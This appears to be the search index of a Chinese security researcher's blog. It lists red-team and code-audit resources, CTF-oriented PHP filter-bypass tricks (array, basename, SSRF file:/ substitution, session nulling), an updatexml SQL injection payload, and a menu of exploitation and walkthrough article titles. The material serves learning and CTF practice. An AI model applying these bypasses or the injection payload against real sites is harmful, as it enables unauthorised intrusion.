<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/home/</url>
    <content><![CDATA[<figure class="highlight plain"><figcaption><span>wiki</span></figcaption><table><tr><td class="code"><pre><span class="line"> _____       ___   _____   ___   _   _        _____   _       _____   _____  </span><br><span class="line">&#x2F;  ___|     &#x2F;   | &#x2F;  _  \ |_  | | | | |      |  _  \ | |     &#x2F;  _  \ &#x2F;  ___| </span><br><span class="line">| |        &#x2F; &#x2F;| | | | | |   | | | |_| |      | |_| | | |     | | | | | |     </span><br><span class="line">| |       &#x2F; &#x2F; | | | |&#x2F;| |   | | |  _  |      |  _  | | |     | | | | | |  _  </span><br><span class="line">| |___   &#x2F; &#x2F;  | | | |_| |   | | | | | |      | |_| | | |___  | |_| | | |_| | </span><br><span class="line">\_____| &#x2F;_&#x2F;   |_| \_____&#x2F;   |_| |_| |_|      |_____&#x2F; |_____| \_____&#x2F; \_____&#x2F; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>ca01h@星盟安全</strong></p>
<p>NTExOTY1NzM4QHFxLmNvbQ==</p>
</blockquote>
<p>互联网时代的知识是零散的，需要有一个写字的地方，把零散的知识汇聚起来，以点连线，以线聚面，一方面能形成一个完整的知识体系，另一方面自己所需之时方便查阅，于是乎就诞生了<strong>ca01hの笔记本</strong>。</p>
<h2 id="Awesome-Articals-Projects">Awesome Articals/Projects</h2>
<h3 id="Linux入侵检测">Linux入侵检测</h3>
<p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p>
<h3 id="红蓝对抗">红蓝对抗</h3>
<p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p>
<p><a href="https://github.com/hudunkey/Red-Team-links">https://github.com/hudunkey/Red-Team-links</a></p>
<h3 id="代码审计">代码审计</h3>
<p><a href="https://github.com/CHYbeta/Code-Audit-Challenges">https://github.com/CHYbeta/Code-Audit-Challenges</a></p>
<p><a href="https://github.com/hongriSec/PHP-Audit-Labs">https://github.com/hongriSec/PHP-Audit-Labs</a></p>
<h3 id="WAF">WAF</h3>
<p><a href="https://wh0ale.github.io/2019/12/04/waf%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0Bypass/">https://wh0ale.github.io/2019/12/04/waf从入门到Bypass/</a></p>
<p><a href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756">https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756</a></p>
<h3 id="java安全">java安全</h3>
<p><a href="https://github.com/threedr3am/learnjavabug">https://github.com/threedr3am/learnjavabug</a></p>
<h3 id="Python安全">Python安全</h3>
<p><a href="https://github.com/bit4woo/python_sec">https://github.com/bit4woo/python_sec</a></p>
<h3 id="字典">字典</h3>
<p><a href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a></p>
<h3 id="求职">求职</h3>
<p><a href="https://github.com/geekcompany/ResumeSample">https://github.com/geekcompany/ResumeSample</a></p>
<p><a href="https://github.com/zhaoweiho/web-sec-interview">https://github.com/zhaoweiho/web-sec-interview</a></p>
<p><a href="https://github.com/EvilAnne/Pentest_questions">https://github.com/EvilAnne/Pentest_questions</a></p>
<h2 id="Bypass-Tricks">Bypass &amp; Tricks</h2>
<h3 id="PHP">PHP</h3>
<h4 id="preg-match绕过">preg_match绕过</h4>
<blockquote>
<p>参考文章：<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p>
</blockquote>
<ul>
<li>数组绕过</li>
<li>PCRE回溯限制（code-breaking2018）</li>
<li>换行符</li>
</ul>
<h4 id="PHP字符串解析特性绕过">PHP字符串解析特性绕过</h4>
<blockquote>
<p>参考文章：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
</blockquote>
<p>借用一张图简单地记一下</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708203746.png" alt=""></p>
<h4 id="SSRF-file协议绕过">SSRF file协议绕过</h4>
<p>如果SSRF中<code>file://</code>关键字被禁用，可以使用<code>file:/</code>或者<code>file:///</code>来代替。</p>
<p>例题：<a href="https://buuoj.cn/challenges#%5BGKCTF2020%5DEZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb">[GKCTF2020]EZ三剑客-EzWeb</a></p>
<h4 id="Session绕过">Session绕过</h4>
<p>删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的<code>$_SESSION['var']</code>就为NULL，相当于传参NULL。</p>
<p>例题：<a href="https://buuoj.cn/challenges#%5BBJDCTF%202nd%5D%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B">BJDCTF2nd 文件探测</a></p>
<h4 id="利用数组绕过">利用数组绕过</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">ereg(pattern,<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">Array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>例题：<a href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">0CTF2016 piapiapia</a></p>
<h4 id="basename绕过">basename绕过</h4>
<p>从 <a href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> 找到了<code>basename()</code>函数的一个问题，它会去掉文件名开头的非ASCII值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(basename(<span class="string">&quot;xffconfig.php&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br><span class="line">var_dump(basename(<span class="string">&quot;config.php/xff&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure>
<p>例题：<a href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">[Zer0pts2020]Can you guess it?</a></p>
<h4 id="htaccess利用">.htaccess利用</h4>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks总结</a></p>
<h3 id="MySQL">MySQL</h3>
<h4 id="禁用concat的updatexml注入">禁用concat的updatexml注入</h4>
<p><a href="https://mochazz.github.io/2018/03/14/%E6%B2%A1%E6%9C%89concat%E7%9A%84updatexml%E6%B3%A8%E5%85%A5">https://mochazz.github.io/2018/03/14/没有concat的updatexml注入</a></p>
<p>替代函数：make_set()，lpad()、reverse()、repeat()、export_set()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select updatexml(1,make_set(3,&#39;~&#39;,(select user())),1);</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>menu</title>
    <url>/menu/</url>
    <content><![CDATA[<h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
<h1 id="置顶文章"><strong>置顶文章</strong></h1>
<ul>
<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
</ul>
<h1 id="Web安全"><strong>Web安全</strong></h1>
<h2 id="Web安全基础">Web安全基础</h2>
<ul>
<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
<li><a href="/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93">MySQL攻击面和提权总结</a></li>
<li><a href="/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C">SQL注入手册</a></li>
</ul>
<h2 id="PHP相关">PHP相关</h2>
<ul>
<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
<li><a href="/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90">PHP复杂变量解析</a></li>
<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
<li><a href="/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE">session.upload-progress+LFI实现RCE</a></li>
</ul>
<h2 id="Writeups">Writeups</h2>
<ul>
<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
<li><a href="/Web_security/ctf_writeup/25.CTFShow-Web%E5%85%A5%E9%97%A8">CTFShow—Web入门</a></li>
<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
<li><a href="/Web_security/ctf_writeup/24.CTFShow-1024%E6%9D%AF-Web-Writeup">CTFShow 1024杯 Web</a></li>
<li><a href="/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0">ByteCTF2020 Web</a></li>
<li><a href="/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup">UNCTF2020 Web</a></li>
<li><a href="/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups">羊城杯2020 Web</a></li>
<li><a href="/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything">NCTF2019 Phar matches everything</a></li>
<li><a href="/Web_security/ctf_writeup/30.%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-Web-WriteUp">纵横杯2020 Web</a></li>
<li><a href="/Web_security/ctf_writeup/31.BMZCTF2020-Web-WriteUp">BMZCTF2020 Web</a></li>
</ul>
<h1 id="靶机系列"><strong>靶机系列</strong></h1>
<h2 id="HackTheBox">HackTheBox</h2>
<ul>
<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
<li><a href="/Target_drone/HackTheBox/18.HTB-Admirer-walkthrough">HTB::Admirer</a></li>
<li><a href="/Target_drone/HackTheBox/19.HackTheBox-Cache-walkthrough">HTB::Cache</a></li>
<li><a href="/Target_drone/HackTheBox/20.HackTheBox-Blunder-walkthrough">HTB::Blunder</a></li>
<li><a href="/Target_drone/HackTheBox/21.HackTheBox-Doctor-Walkthrough">HTB::Doctor</a></li>
<li><a href="/Target_drone/HackTheBox/22.HackTheBox-Academy-Walkthrough">HTB::Academy</a></li>
<li><a href="/Target_drone/HackTheBox/23.HackTheBox-Delivery-Walkthrough">HTB::Delivery</a></li>
<li><a href="/Target_drone/HackTheBox/24.HackTheBox-Passage-Walkthrough">HTB::Passage</a></li>
</ul>
<h2 id="VulnHub">VulnHub</h2>
<ul>
<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
</ul>
<h1 id="代码审计"><strong>代码审计</strong></h1>
<h2 id="PHP代码审计">PHP代码审计</h2>
<ul>
<li><a href="/code_audit/PHP/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
<li><a href="/code_audit/PHP/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
<li><a href="/code_audit/PHP/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
<li><a href="/code_audit/PHP/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
<li><a href="/code_audit/PHP/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
<li><a href="/code_audit/PHP/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
<li><a href="/code_audit/PHP/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
<li><a href="/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95">CVE-2020-15148 Yii2反序列化</a></li>
<li><a href="/code_audit/PHP/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0">74CMS模板注入+文件包含getshell</a></li>
<li><a href="/code_audit/PHP/10.PHPECMS3.5getshell">【密文保护】PHPECMS3.5getshell</a></li>
<li><a href="/code_audit/PHP/11.ZZCMS8.2%E5%AE%A1%E8%AE%A1">ZZCMS8.2</a></li>
<li><a href="/code_audit/PHP/14.maccms8.x%E5%AE%A1%E8%AE%A1">maccms8.x</a></li>
<li><a href="/code_audit/PHP/12.DeDeCMSV5.7%E5%AE%A1%E8%AE%A1">DeDeCMSV5.7审计</a></li>
<li><a href="/code_audit/PHP/13.HDWiki6.0sql%E6%B3%A8%E5%85%A5">HDWiki6.0sql注入</a></li>
<li><a href="/code_audit/PHP/15.TP3.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE-MySQL%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF">TP3.0反序列化POP链-MySQL伪造恶意服务端</a></li>
<li><a href="/code_audit/PHP/16.Drupal%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0">Drupal历史漏洞分析复现</a></li>
</ul>
<h1 id="大数据安全">大数据安全</h1>
<ul>
<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
</ul>
<h1 id="机器学习"><strong>机器学习</strong></h1>
<h2 id="基础学习">基础学习</h2>
<ul>
<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
</ul>
<h1 id="Python"><strong>Python</strong></h1>
<h2 id="Python基础">Python基础</h2>
<ul>
<li><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></li>
<li><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></li>
<li><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></li>
<li><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></li>
<li><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></li>
<li><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></li>
</ul>
<h2 id="Python安全">Python安全</h2>
<ul>
<li><a href="/Python/pysec/1.Jinja2%E7%9A%84SSTI+Bypass">Jinja2 SSTI&amp;Bypass</a></li>
<li><a href="/Python/pysec/2.Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">Python沙箱逃逸</a></li>
